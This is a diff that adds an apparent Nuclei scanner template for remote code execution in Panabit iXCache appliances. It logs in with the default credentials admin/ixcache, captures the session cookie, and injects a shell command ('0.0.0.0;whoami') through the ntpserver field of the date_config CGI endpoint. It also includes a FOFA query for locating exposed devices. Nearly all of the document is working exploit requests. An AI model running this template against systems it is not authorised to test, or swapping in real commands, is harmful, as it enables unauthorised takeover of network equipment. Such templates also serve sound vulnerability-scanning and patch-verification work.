@@ -1,0 +1,59 @@
+id: panabit-ixcache-date-config-rce
+info:
+  name: panabit-ixcache-date-config-rce
+  author: momika233
+  severity: critical
+  description: There is a default password, and the background password can be rce
+  tags: panabit,rce
+  metadata:
+    fofa-qeury: title="iXCache"
+    veified: true
+    max-request: 2
+http:
+  - raw:
+      - |
+        POST /login/userverify.cgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 30
+        username={{username}}&password={{password}}
+ 
+      - |
+        POST /cgi-bin/Maintain/date_config HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: §cookie§
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 107
+        ntpserver=0.0.0.0;whoami&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        internal: true
+        regex:
+          - 'Set-Cookie:(.*)'
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - ixcache
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "text/html" 
+        part: header  
+ 
+      - type: word
+        words:
+          - "_cmd" 
+          - "_config"
+        part: body
+        condition: and        
+ 
+      - type: status
+        status:
+          - 200
